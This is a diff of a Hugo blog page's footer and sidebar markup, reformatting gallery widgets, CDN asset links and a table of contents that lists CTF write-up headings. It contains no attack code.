+2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-<div class=pswp__preloader>
-<div class=pswp__preloader__icn>
-<div class=pswp__preloader__cut>
-<div class=pswp__preloader__donut></div>
-</div>
-</div>
-</div>
-</div>
-<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-<div class=pswp__share-tooltip></div>
-</div>
-<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-</button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-</button>
-<div class=pswp__caption>
-<div class=pswp__caption__center></div>
-</div>
-</div>
-</div>
-</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
-</main>
-<aside class="sidebar right-sidebar sticky">
-<section class="widget archives">
-<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
-</div>
-<h2 class="widget-title section-title">Table of contents</h2>
-<div class=widget--toc>
-<nav id=TableOfContents>
-<ol>
-<li><a href=#file-magician>File Magician</a>
-<ol>
-<li><a href=#other-file>other file</a>
-<ol>
-<li><a href=#tex-dvi-file>TeX DVI file</a></li>
-<li><a href=#jpeg>jpeg</a></li>
-<li><a href=#heading>#!</a></li>
-<li><a href=#gz>gz</a></li>
-</ol>
-</li>
-</ol>
-</li>
-<li><a href=#writeupbin>WriteUpBin</a>
-<ol>
-<li><a href=#parsleyjs>Parsley.js</a></li>
-<li><a href=#css-selector>CSS Selector</a></li>
-<li><a href=#other-selector>Other Selector</a></li>
-</ol>
-</li>
-<li><a href=#includer>Includer</a>
-<ol>
-<li><a href=#configuration-error>Configuration Error</a></li>
-<li><a href=#upload-arbitrary-data>Upload Arbitrary Data</a></li>
-<li><a href=#keep-temp-file>Keep Temp File</a></li>
-<li><a href=#bypass-waf>Bypass Waf</a></li>
-<li><a href=#leak-dir-path>Leak Dir path</a></li>
-<li><a href=#get-flag>Get Flag</a></li>
-</ol>
-</li>
-<li><a href=#references>References</a></li>
-</ol>
-</nav>
-</div>
-</section>
-</aside>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
-<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
-<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
-</body>
-</html>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#file-magician>File Magician</a><ol><li><a href=#other-file>other file</a><ol><li><a href=#tex-dvi-file>TeX DVI file</a></li><li><a href=#jpeg>jpeg</a></li><li><a href=#heading>#!</a></li><li><a href=#gz>gz</a></li></ol></li></ol></li><li><a href=#writeupbin>WriteUpBin</a><ol><li><a href=#parsleyjs>Parsley.js</a></li><li><a href=#css-selector>CSS Selector</a></li><li><a href=#other-selector>Other Selector</a></li></ol></li><li><a href=#includer>Includer</a><ol><li><a href=#configuration-error>Configuration Error</a></li><li><a href=#upload-arbitrary-data>Upload Arbitrary Data</a></li><li><a href=#keep-temp-file>Keep Temp File</a></li><li><a href=#bypass-waf>Bypass Waf</a></li><li><a href=#leak-dir-path>Leak Dir path</a></li><li><a href=#get-flag>Get Flag</a></li></ol></li><li><a href=#references>References</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
+<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
